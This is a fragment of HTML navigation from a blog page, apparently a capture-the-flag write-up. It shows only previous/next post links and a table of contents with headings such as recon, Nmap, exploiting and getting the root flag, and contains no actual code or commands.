<a href=/blog/2019/08/bastion/>Bastion</a></li></ul></p><p><div class=previous-post><a href="https://sequr.be/blog/2019/08/bastion/?ref=footer"><span style=font-weight:700>« Previous</span><br>Bastion</a><div class=next-post><a href="https://sequr.be/blog/2019/08/emdee-five-for-life/?ref=footer"><span style=font-weight:700>Next »</span><br>Emdee five for life</a></div></p></div></footer></article></section><aside class=article-toc><div class=toc-wrapper><h4 id=contents></h4><nav id=TableOfContents><ul><li><a href=#tools-used>Tools used</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li></ul></li><li><a href=#having-a-look-at-port-80>Having a look at port 80</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#-getting-the-user-flag>$ Getting the user flag</a></li><li><a href=#going-for-root>Going for root</a><ul><li><a href=#mind-your-path>Mind your $PATH</a></li><li><a href=#-getting-the-root-flag># Getting the root flag</a></li></ul></li></ul></nav></div></aside></div></body></html>